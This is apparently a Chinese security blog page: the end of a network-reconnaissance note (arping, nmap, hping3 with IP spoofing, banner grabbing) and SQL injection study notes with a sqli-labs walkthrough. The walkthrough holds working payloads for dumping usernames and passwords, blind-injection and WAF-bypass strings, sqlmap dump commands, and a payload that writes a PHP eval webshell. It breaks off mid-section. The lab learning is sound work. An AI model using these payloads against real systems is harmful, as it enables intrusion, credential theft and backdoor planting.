</li>
<li><p>arping 1.1.1.1 -d</p>
<p>发现重复响应，不同mac地址拥有相同的IP时，退出返回1</p>
<p> arp地址欺骗：在你的网络里有另外一个IP地址，声称自己是网关IP，发给网关的数据包就会发给欺骗的主机，该主机的所有者就可以在其机器上抓包，实现中间人攻击，嗅探甚至修改通过该主机传输的数据包，窃取密码，篡改数据，实现一些恶意攻击。</p>
</li>
<li><p>arping -c 1.1.1.1 grep “bytes from”|cut -d “ “ -f 5|cut -d “(“ -f 2 |cut -d “)” -f 1</p>
</li>
<li><p>脚本：</p>
<p>arping1.sh eth0&gt;addrs</p>
</li>
</ul>
<p>​       arping2.sh addrs    </p>
<h5 id="nmap二层发现"><a href="#nmap二层发现" class="headerlink" title="nmap二层发现"></a>nmap二层发现</h5><ul>
<li>nmap 1.1.1.1-254 -sn</li>
<li>nmap 1.1.1.1/24 -sn</li>
</ul>
<p>​          -sn ping扫描，禁用端口扫描</p>
<ul>
<li>​    nmap -iL iplist.txt -sn （扫描文件内IP，类似arping2.sh功能）</li>
</ul>
<h5 id="Netdiscover–二层发现"><a href="#Netdiscover–二层发现" class="headerlink" title="Netdiscover–二层发现"></a>Netdiscover–二层发现</h5><ol>
<li>专用于二层发现</li>
<li>可用于无线和交换网络环境</li>
<li>主动和被动探测</li>
</ol>
<p><strong>主动</strong></p>
<p>netdiscover -i eth0 -r 192.168.1/24</p>
<p>netdiscover -i iplist.txt</p>
<p><strong>被动</strong></p>
<p>netdiscover -p  #将本地网卡赋值为混杂模式，非本网卡的数据包也会被侦听到</p>
<p>主动arp容易触发报警</p>
<h5 id="Scapy-二层发现"><a href="#Scapy-二层发现" class="headerlink" title="Scapy-二层发现"></a>Scapy-二层发现</h5><p>•作为Python库进行调用</p>
<p>•也可作为单独的工具使用</p>
<p>•抓包、分析、创建、修改、注入网络流量</p>
<p>• apt-get install python-gnuplot #安装python-gnuplot组件</p>
<p>• Scapy  #启动Scapy</p>
<h4 id="发现-三层发现"><a href="#发现-三层发现" class="headerlink" title="发现-三层发现"></a>发现-三层发现</h4><p>IP,icmp协议  网络控制管理层</p>
<p>路径发现，主机网络通断的诊断</p>
<p>优点：可路由，速度快。</p>
<p>缺点：速度比二层慢，经常被边界防火墙过滤。</p>
<h5 id="ping-icmp"><a href="#ping-icmp" class="headerlink" title="ping(icmp)"></a>ping(icmp)</h5><ul>
<li>ping 192.168.1.1 -c 2（设置发包的数量）</li>
<li>路由追踪：traceroute <a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a></li>
<li>ping -R 192.168.1.1</li>
<li>ping 192.168.1.1 -c 1 | grep “bytes from”|cut -d “” -f 4 | cut -d “.” -f 1</li>
</ul>
<h5 id="Scapy"><a href="#Scapy" class="headerlink" title="Scapy"></a>Scapy</h5><p>OSI多层堆叠手工声称ICMP包-IP/icmp</p>
<ul>
<li>i=Ip()</li>
<li>i.dst=”192.168.1.1”（目标IP地址）</li>
<li>p=ICMP()</li>
<li>a=str(i/p)</li>
<li>a.display()</li>
</ul>
<h5 id="Nmap——三层发现"><a href="#Nmap——三层发现" class="headerlink" title="Nmap——三层发现"></a>Nmap——三层发现</h5><p>nmap -sn 192.168.1/24  (-sn在同一网段，用arp，不同网段，用ICMP)</p>
<h5 id="fping-——三层发现"><a href="#fping-——三层发现" class="headerlink" title="fping ——三层发现"></a>fping ——三层发现</h5><ul>
<li>fping 1.1.1.1 -c 1 （会显示包大小、响应时间、丢包率）</li>
<li>fping -g 1.1.1.1  1.1.1.2(起始参数 结束参数)</li>
<li>fping -g 1.1.1.0/24</li>
<li>fping -f iplist.txt</li>
</ul>
<h5 id="hping——三层发现"><a href="#hping——三层发现" class="headerlink" title="hping——三层发现"></a>hping——三层发现</h5><ul>
<li>Hping(功能强大)</li>
<li>能够发送几乎任意TCP/IP包</li>
<li>功能强大但每次只能扫描一个目标</li>
<li>hping3 192.168.1.1 –icmp -c 5(发5个ping包)</li>
<li>for addr in $(seq 1 254); do hping3 192.168.1.$addr –icmp -c 5 &gt;&gt; handle.txt &amp; done</li>
</ul>
<h4 id="发现——四层扫描"><a href="#发现——四层扫描" class="headerlink" title="发现——四层扫描"></a>发现——四层扫描</h4><p>优点</p>
<ul>
<li>可路由且结果可靠</li>
<li>不太可能被防火墙过滤</li>
<li>甚至可以发现所有端口都被过滤的主机</li>
</ul>
<p>缺点</p>
<ul>
<li>基于状态过滤的防火墙可能过滤扫描</li>
<li>全端口扫描速度慢</li>
</ul>
<p>TCP(三次握手)</p>
<p>未经请求的ACK-RST（非正常通信：目标在线）</p>
<p>SYN-SYN/ACK、RST(正常通信：目标在线)</p>
<p>UDP</p>
<p>目标IP不在线，无响应，目标IP在线、探测的端口也是开放状态，目标主机不会回复；只有一种情况可以探测：我发向目标IP一个没有开放的端口，对方回复一个ICNP端口不可达、一去不复返。</p>
<p>ACK—Tcp  Port—-RST(如果返回rst则在线)</p>
<p>scapy：</p>
<p>\1. i=IP()</p>
<p>\2. t=TCP()</p>
<p>3.r=(i/t)</p>
<p>4.r[tcp].flags=’A’（表示发ack包）</p>
<p>r[IP].dst=”1.1.1.1”</p>
<p>a=sr1(r)</p>
<p>a.display()(查看返回的包)</p>
<p>a=sr1(IP(dst=”1.1.1.1”)/TCP(dport=80,flags=’A’),timeout=1)</p>
<p>UDP—–UDP Port—–icmp</p>
<p>1.u=UDP()</p>
<p>2.u.deport=33333</p>
<p>3.r=(i/u)</p>
<p>4.a=sr1(r.timeout=1,verbose=1)</p>
<p>5.a.display()</p>
<p>6.a=sr1(r)</p>
<p>port-unreachable(目标端口不可达)</p>
<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><h5 id="scapy"><a href="#scapy" class="headerlink" title="scapy"></a>scapy</h5><p>str1(dst=”192.168.1.1”/TCP(dport=80),timeout=1,verbose=1)</p>
<p>操作系统莫名接受一个syn/ack包，会自动给目标服务器回复一个rst包</p>
<h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h5><p>nmap -sS 1.1.1.1 -p 80,21,25,443</p>
<p>可以不加-sS 默认是-sS</p>
<p>-p 1-100 扫描1到100</p>
<p>-p 全扫描</p>
<p>–open 只显示open的端口</p>
<p>nmap -sS -iL test.txt -p 80</p>
<h5 id="hping3"><a href="#hping3" class="headerlink" title="hping3:"></a>hping3:</h5><p>hping3 1.1.1.1 –scan 80,21,25 -S</p>
<p>hping3 1.1.1.1 –scan 0-65535 -S</p>
<p>hping3 -c 10 -S –spoof 192.168.1.140 -p ++1 192.168.1.1</p>
<p>-c 发包数量 –spoof欺骗伪造成另一个IP</p>
<p>++1端口号每次+1</p>
<h5 id="全连接端口扫描"><a href="#全连接端口扫描" class="headerlink" title="全连接端口扫描"></a>全连接端口扫描</h5><p>全连接对scapy比较困难</p>
<p>特殊情况下隐蔽扫描无法准确检测</p>
<p>把操作系统返回的rst包被iptable过滤掉,建立完整的连接</p>
<p>iptables -A OUTPUT -p tcp –tcp-flags RST RST -d 192.168.1.134 -j DROP</p>
<p>-d 目标ip</p>
<p>scapy脚本</p>
<p><strong>nmap:</strong></p>
<p>nmap -sT 1.1.1.1 -p 80,21</p>
<p>nmap -sT 1.1.1.1 -p 80-2000</p>
<p>nmap -sT -iL test.txt -p 80</p>
<p>不加-p 默认1000个常用端口</p>
<p><strong>dmitry:</strong></p>
<p>功能简单,但使用简便,默认150个做常用端口</p>
<p>dmitry -p 1.1.1.1  //tcp扫描</p>
<p>dmitry -p 1.1.1.1 -o output</p>
<p>-o 保存到文件</p>
<p><strong>nc:</strong></p>
<p>nc -nv -w l -z 1.1.1.1 1-100</p>
<p>-w 超时时间</p>
<h4 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h4><ul>
<li><p>识别开发端口上运行的应用</p>
</li>
<li><p>识别目标操作系统</p>
</li>
<li><p>提高攻击效率</p>
<ul>
<li>Banner捕获</li>
<li>服务识别</li>
<li>操作系统识别</li>
<li>SNMP分析</li>
<li>防火墙识别</li>
</ul>
<h5 id="服务扫描——banner"><a href="#服务扫描——banner" class="headerlink" title="服务扫描——banner"></a>服务扫描——banner</h5><ul>
<li>软件开发商</li>
<li>软件名称</li>
<li>服务类型</li>
<li>版本号</li>
<li>直接发现已知的漏洞和弱点</li>
</ul>
</li>
<li><p>连接建立后直接获取banner</p>
</li>
<li><p>另类服务识别方法</p>
<ul>
<li>特征行为和响应字段</li>
<li>不同的响应可用于识别底层操作系统</li>
</ul>
<p><strong>Python socket</strong></p>
<ul>
<li><p>Socket模块用于连接网络服务</p>
<pre><code>import socket
bangrab=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
bangrab.connect((&quot;1.1.1.1&quot;,21))
bangrab.recv(4096)
bangrab.close()
exit()</code></pre></li>
<li><p>Banner不允许抓取，recv函数无返回将挂起！</p>
</li>
</ul>
<p><strong>dmitry</strong></p>
<ul>
<li><code>dmitry -p 192.168.153.131</code></li>
<li><code>dmitry -pb 192.168.153.131</code></li>
</ul>
<p><strong>nmap</strong></p>
<p><code>nmap -sT 192.168.153.131 -p 22 --script=banner.nse</code></p>
<p><strong>amap</strong></p>
<ul>
<li><code>amap -B 192.168.153.131 21</code></li>
<li><code>amap -B 192.168.153.131 1-65535</code></li>
<li><code>amap -B  192.168.153.131|grep on</code></li>
</ul>
<p>banner信息抓取能力有限</p>
<p>nmap响应特征分析识别服务</p>
<ul>
<li>发送系列复杂的探测</li>
<li>依据响应特征signature</li>
<li><code>nc  -nv 1.1.1.1 80</code></li>
<li><code>nmap 1.1.1.1 -p 80 -sV</code></li>
</ul>
<h5 id="服务扫描——SNMP"><a href="#服务扫描——SNMP" class="headerlink" title="服务扫描——SNMP"></a>服务扫描——SNMP</h5><ul>
<li><p>简单网络管理协议</p>
</li>
<li><p>Community strings</p>
</li>
<li><p>信息查询或重新配置</p>
<p>识别和绕过防火墙筛选</p>
</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/" itemprop="url">SQL注入知识点总结+靶场笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-12T18:46:30+08:00">
                2020-03-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">web漏洞学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="SQL注入漏洞学习笔记-靶场总结"><a href="#SQL注入漏洞学习笔记-靶场总结" class="headerlink" title="SQL注入漏洞学习笔记+靶场总结"></a>SQL注入漏洞学习笔记+靶场总结</h2><h4 id="mysql相关知识点"><a href="#mysql相关知识点" class="headerlink" title="mysql相关知识点"></a>mysql相关知识点</h4><h5 id="Mysql-5-x数据结构"><a href="#Mysql-5-x数据结构" class="headerlink" title="Mysql 5.x数据结构"></a><strong>Mysql 5.x数据结构</strong></h5><p>​      在Mysql5.0以上的版本中，为了方便管理，默认定义了information_schema数据库，用来存储数据库元信息。其中具有表schemata(数据库名)、tables（表名）、columns(列名或字段名)。</p>
<p>​     在schemata表中，schema_name字段用来存储数据库名。</p>
<p>​     在tables表中，table_schema和table_name分别用来存储数据库名和表名。</p>
<p>​    在columns表中，table_schema(数据库名)、table_name(表名)、column_name(字段名)</p>
<p>利用Navicat for MySQL查看结构。</p>
<h5 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a><strong>增删改查</strong></h5><p><strong>SELECT</strong></p>
<p>SELECT 列名称 FROM 表名称 WHERE 字段1=‘条件</p>
<p>一’ AND 字段2=‘条件2’</p>
<p><strong>INSERT</strong></p>
<p>INSERT INTO table_name(列1…列2) VALUES(值1….值2….)</p>
<p><strong>UPDATE</strong></p>
<p>UPDATE 表名称 SET 列名称=新值 WHERE 列名称=某值</p>
<p><strong>DELETE</strong></p>
<p>DELETE FROM 表名称 WHERE 列名称=值</p>
<h5 id="Mysql常用的几种函数："><a href="#Mysql常用的几种函数：" class="headerlink" title="Mysql常用的几种函数："></a><strong>Mysql常用的几种函数：</strong></h5><p>user():查看当前Mysql登录用户名；</p>
<p>database():查看当前使用Mysql数据库名；</p>
<p>version():查看当前Mysql版本。</p>
<p>扩展limit关键字 limit m,n 从m行开始，到m+n行。</p>
<h5 id="注释"><a href="#注释" class="headerlink" title="注释"></a><strong>注释</strong></h5><ul>
<li>注释符：在Mysql中常见的注释符表达式：#、–空格、/**/</li>
<li>/<em>！SQL语句、\</em>/只有Mysql可以识别，常用来绕过WAF。</li>
</ul>
<p>例如：select * from articles where id -id ;</p>
<p>使用内联注释注入：select * from articles where id=-1 /<em>!union\</em>/ /*!select*/ 1,2,3,4</p>
<h5 id="注入点查找"><a href="#注入点查找" class="headerlink" title="注入点查找"></a>注入点查找</h5><ul>
<li>and 1=1/and 1=2（整型）</li>
<li>随机输入(整型)</li>
<li>-1/+1回显上下页</li>
<li>单引号（字符型/整型）</li>
<li>and sleep(5)(判断页面返回时间)</li>
</ul>
<h4 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h4><p><strong>根据语法：</strong></p>
<p><strong>1.可联合查询注入：</strong></p>
<p>注入前提：能使用union , 页面必须有显示位</p>
<p>注入方法：</p>
<ul>
<li>找到注入点并判断闭合字符</li>
<li>判断数据库类型</li>
<li>猜解列数，爆显示位</li>
<li>得到基本信息（如数据库名、数据库版本等）</li>
<li>猜解表名</li>
<li>得到列名</li>
<li>得到列值</li>
</ul>
<p><strong>2.报错型注入</strong></p>
<p>注入前提：页面没有显示位，源码使用了echo mysql_error输出了错误信息</p>
<p>​                    注入速度快，语句复杂、不能使用group_concat(),只能使用limit依次猜解</p>
<p>注入方法：</p>
<ul>
<li>floor报错注入</li>
</ul>
<p>​      select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x;</p>
<ul>
<li><p>updatexml报错注入</p>
</li>
<li><p>extractvalue报错注入</p>
</li>
</ul>
<p><strong>3.布尔型注入</strong></p>
<p>注入前提：页面存在注入但是没有显示位且源码没有使用echo mysql_error()输出报错信息。</p>
<p>注入方法:</p>
<ul>
<li>?id=1 and (注入语句) # 根据返回结果是否相同来得到数据</li>
<li>主要利用了length()、ascii()、substr()得到结果</li>
</ul>
<p><strong>4.基于时间延迟注入</strong></p>
<p>根据页面返回时间的不同来得到数据</p>
<h5 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h5><p>题目地址：<a href="http://123.206.87.240:9004/1ndex.php?id=1" target="_blank" rel="noopener">http://123.206.87.240:9004/1ndex.php?id=1</a></p>
<p>做题步骤：检测注入=&gt;了解过滤=&gt;获取数据</p>
<h5 id="orderby-注入"><a href="#orderby-注入" class="headerlink" title="orderby 注入"></a>orderby 注入</h5><p><code>select username,password FROM  users order by 1 asc;</code></p>
<p>1.直接加报错注入</p>
<p>2.Rand()方式</p>
<p>3.And payload时间盲注方式</p>
<p>4.其他方式</p>
<p><strong>5.多语句查询(堆叠查询）</strong></p>
<p>注入前提：只在MSSQL数据库存在</p>
<p>注入方法：一个SQL语句后跟分号后再跟一个语句即可执行两个语句。</p>
<p><strong>根据类型：</strong></p>
<ul>
<li>整型</li>
<li>字符串型</li>
<li>搜索型</li>
</ul>
<h5 id="注入位置"><a href="#注入位置" class="headerlink" title="注入位置"></a>注入位置</h5><ul>
<li>GET</li>
<li>POST</li>
<li>X-Forward-For</li>
<li>Cookie</li>
<li>User-Agent</li>
</ul>
<h4 id="SQL注入绕过机制"><a href="#SQL注入绕过机制" class="headerlink" title="SQL注入绕过机制"></a>SQL注入绕过机制</h4><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p>​         如果程序中设置了过滤关键字，但是过滤过程中并没有对关键字组成进行深入分析过滤，导致只是对整体进行过滤。例如：and过滤。当然这种过滤只是发现关键字出现。并不会对关键字进行处理。<br>​    通过修改关键字内字母大小写来绕过过滤措施。例如： AnD 1=1</p>
<p>​     例如，在进行探测当前表的字段数时，使用order by数字进行探测。如果过滤了order,可以使用OrdER来进行绕过。</p>
<h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p>如果在程序中设置出现关键字之后替换为空，那么SQL注入攻击也不会发生。对于这样的过滤策略可以使用双写绕过。</p>
<p>例如：过滤了union，我们可以使用ununionion进行绕过。</p>
<h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p>可以利用网络中的URL在线编码，绕过SQL注入的过滤机制。</p>
<img src="QQ截图20200206143207.png" style="zoom:80%;" />

<hr>
<h5 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h5><p>在Mysql中内联注释中的内容可以被当做SQL语句执行。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206143914.png" alt=""></p>
<h4 id="sqlmap基础使用方法"><a href="#sqlmap基础使用方法" class="headerlink" title="sqlmap基础使用方法"></a>sqlmap<strong>基础使用方法</strong></h4><h5 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a><strong>sqlmap简介</strong></h5><p>​       sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令</p>
<p>​         sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。</p>
<p>sqlmap支持五种不同的注入模式：</p>
<ul>
<li>基于布尔的盲注：既可以根据返回页面判断条件真假的注入。</li>
</ul>
<p>​        向数据库发送true或false这样的问题，并根据应用程序赶回的信息判断结果、这种攻击的出现是因为应用程序配置为只显示常规错误，但并没有解决SQL注入存在的代码问题。</p>
<ul>
<li>基于时间的盲注:即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</li>
<li>基于报错注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li>
<li>联合查询注入：可以使用union的情况下的注入</li>
<li>堆查询注入：可以同时执行多条语句的执行时注入</li>
</ul>
<p><strong>sqlmap常用参数</strong></p>
<ul>
<li><p>-h -help显示基本帮助信息</p>
</li>
<li><p>-hh 显示高级帮助信息并退出</p>
</li>
<li><p>-u指定url</p>
</li>
<li><p>-p指定参数</p>
</li>
<li><p>-D指定数据库</p>
</li>
<li><p>-T指定表</p>
</li>
<li><p>-C指定字段</p>
</li>
<li><p>–current-db当前数据库</p>
</li>
<li><p>–current-user当前用户</p>
</li>
<li><p>–dbs查询所有数据库</p>
</li>
<li><p>–tables查询所有表</p>
</li>
<li><p>–columns查询所有字段名</p>
</li>
<li><p>–dump查询记录</p>
</li>
<li><p>–techniques X(X=B布尔型，E报错型，U联合注入型，T延时型）</p>
</li>
</ul>
<h4 id="sqli-labs靶场实战"><a href="#sqli-labs靶场实战" class="headerlink" title="sqli-labs靶场实战"></a>sqli-labs靶场实战</h4><h5 id="less-1-基于错误的GET单引号字符型注入）"><a href="#less-1-基于错误的GET单引号字符型注入）" class="headerlink" title="less-1 (基于错误的GET单引号字符型注入）"></a>less-1 (基于错误的GET单引号字符型注入）</h5><p><strong>注入过程：</strong></p>
<p>?id=1’ or 1=1 %23</p>
<p>?id=1’ order by 3 %23  #字段数为3</p>
<p>?id=1’ union select 1,2,3 #显示位为2，3</p>
<p><strong>爆库名</strong></p>
<p>?id=1’ union select 1,2,(select group_concat(schema_name) from information_schema.schemata) %23 </p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205184721.png" alt=""></p>
<p><strong>爆表名</strong></p>
<p>?id=1’ union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)%23 </p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205184704.png" alt=""></p>
<p><strong>爆列名</strong></p>
<p>?id=1’ union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=’user’) %23 </p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205184647.png" alt=""></p>
<p><strong>爆用户名和密码</strong></p>
<p>?id=1’ union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) %23  </p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205184623.png" alt=""></p>
<p><strong>使用sqlmap自动化探测</strong></p>
<p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --dbs --batch</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205190036.png" alt=""></p>
<p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security --tables --batch</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205190557.png" alt=""></p>
<p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security -T users --batch</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205190649.png" alt=""></p>
<p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security -T users -C password,username --dump --batch</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205192706.png" alt=""></p>
<h5 id="Less-2-（基于错误的GET整型注入）"><a href="#Less-2-（基于错误的GET整型注入）" class="headerlink" title="Less-2 （基于错误的GET整型注入）"></a>Less-2 （基于错误的GET整型注入）</h5><p>数字型注入，去掉单引号即可。</p>
<p>构造同Less-1</p>
<h5 id="Less-3-（基于错误的GET单引号变形字符型注入）"><a href="#Less-3-（基于错误的GET单引号变形字符型注入）" class="headerlink" title="Less-3 （基于错误的GET单引号变形字符型注入）"></a>Less-3 （基于错误的GET单引号变形字符型注入）</h5><p>?id=1’) %23 回显正常</p>
<p>构造同Less-1</p>
<h5 id="Less-4（基于错误的GET双引号字符型注入）"><a href="#Less-4（基于错误的GET双引号字符型注入）" class="headerlink" title="Less-4（基于错误的GET双引号字符型注入）"></a>Less-4（基于错误的GET双引号字符型注入）</h5><p>?id=1”)%23 回显正常</p>
<p>构造同Less-01</p>
<h5 id="Less-5（双注入GET单引号字符型注入）"><a href="#Less-5（双注入GET单引号字符型注入）" class="headerlink" title="Less-5（双注入GET单引号字符型注入）"></a>Less-5（双注入GET单引号字符型注入）</h5><p><strong>爆库名</strong></p>
<p>?id=1’ union select count(<em>),1, concat(‘<del>‘,(select database()),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a %23</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206132510.png" alt=""></p>
<p><strong>爆表名</strong></p>
<p>?id=1’ union select count(<em>),1, concat(‘<del>‘,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a %23</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206132607.png" alt=""></p>
<p><strong>更换Limit后的数字即可查出其他表名</strong></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206132652.png" alt=""></p>
<p><strong>爆user表列名</strong></p>
<p>?id=1’  union select count(*),1, concat(‘<del>‘,(select column_namefrom information_schema.tables where table_schema=’security’   and table_name=’users’ limit 0,1),’</del>‘,floor(rand()2)) as a from information_schema gruop by a %23</p>
<p><strong>爆username password内容</strong></p>
<p> ?id=1’union select count(<em>),1, concat(‘<del>‘,(select username from users limit 0,1),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a %23</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206133237.png" alt=""></p>
<p>?id=1’union select count(<em>),1, concat(‘<del>‘,(select password from users limit 0,1),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a  %23</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206133320.png" alt=""></p>
<h5 id="Less-6-双注入GET双引号字符型注入）"><a href="#Less-6-双注入GET双引号字符型注入）" class="headerlink" title="Less-6 (双注入GET双引号字符型注入）"></a>Less-6 (双注入GET双引号字符型注入）</h5><p>将单引号换成双引号即可</p>
<p>构造同上</p>
<h5 id="Less-7-导出文件GET字符型注入）"><a href="#Less-7-导出文件GET字符型注入）" class="headerlink" title="Less-7(导出文件GET字符型注入）"></a>Less-7(导出文件GET字符型注入）</h5><p>我们首先需要打开phpstudy\PHPTutorial\MySQL\my.ini文件，在其中加上一句：secure_file_priv=“/”。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206122518.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206120820.png" alt=""></p>
<p>我们需要用到两个函数：</p>
<p><strong>load_file()：</strong>读取本地文件</p>
<p><strong>into outfile()</strong> 写文件 （路径需要使用双斜线）</p>
<p>我们首先判断注入点：</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206121046.png" alt=""></p>
<p>然后我们使用outfile函数将一句话木马写入文件。</p>
<pre class=" language-mysql"><code class="language-mysql">?id=-1')) union select 1,2,'<?php @eval($_POST["crow"]);?>' into outfile "D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\test.php"</code></pre>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206123636.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206123628.png" alt=""></p>
<p>之后我们使用中国菜刀连接即可。 </p>
<h5 id="Less-8-基于布尔的盲注）"><a href="#Less-8-基于布尔的盲注）" class="headerlink" title="Less-8 (基于布尔的盲注）"></a>Less-8 (基于布尔的盲注）</h5><p><strong>爆数据库长度</strong></p>
<p>?id=1’ and (length(database())) = 8 %23 #数据库长度为8</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205195014.png" alt=""></p>
<p>我们任意修改长度，页面不回显</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205195102.png" alt=""></p>
<p><strong>爆库名</strong></p>
<p>?id=1’ and (ascii(substr((select database()) ,1,1))) = 115 %23 # s</p>
<p>?id=1’and(ascii(substr((select database()),2,1)))=101 %23 #e</p>
<p>?id=1’and(ascii(substr((select database()),3,1)))=99 %23 #c</p>
<p>?id=1’ and (ascii(substr((select database()) ,4,1))) = 117 –+ #u</p>
<p>?id=1’ and (ascii(substr((select database()) ,5,1))) = 114 –+ #r</p>
<p>​    and (ascii(substr((select database()) ,6,1))) = 105 –+    #i</p>
<p> and (ascii(substr((select database()) ,7,1))) = 116 –+   #t</p>
<p>?id=1’ and (ascii(substr((select database()) ,8,1))) = 121 –+  #y</p>
<p><strong>爆表名长度</strong></p>
<p>?id=1’ and (length((select table_name from information_schema.tables  where table_schema=database() limit 0,1)))=6 %23</p>
<p>类推以上即可：</p>
<h5 id="Less-9（基于时间的GET单引号盲注）"><a href="#Less-9（基于时间的GET单引号盲注）" class="headerlink" title="Less-9（基于时间的GET单引号盲注）"></a>Less-9（基于时间的GET单引号盲注）</h5><p>?id=1’ and sleep(5) %23</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205194242.png" alt=""></p>
<p>?id=1’ and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5)) %23</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205194753.png" alt=""></p>
<p>接下来使用sqlmap自动化注入</p>
<p><strong>爆数据库名：</strong></p>
<pre><code>python sqlmap.py -u http://localhost:8088/sqlilabs/Less-9/?id=1 --technique T --dbms mysql --dbs --batch</code></pre><p><strong>爆表名：</strong></p>
<pre><code>python sqlmap.py -u http://localhost:8088/sqlilabs/Less-9/?id=1 --technique T --dbms mysql -D security --tables --batch </code></pre><p><strong>爆列名</strong>：</p>
<pre><code> python sqlmap.py -u http://localhost:8088/sqlilabs/Less-9/?id=1 --technique T --dbms mysql -D security -T users --column --batch</code></pre><p><strong>爆内容 ：</strong></p>
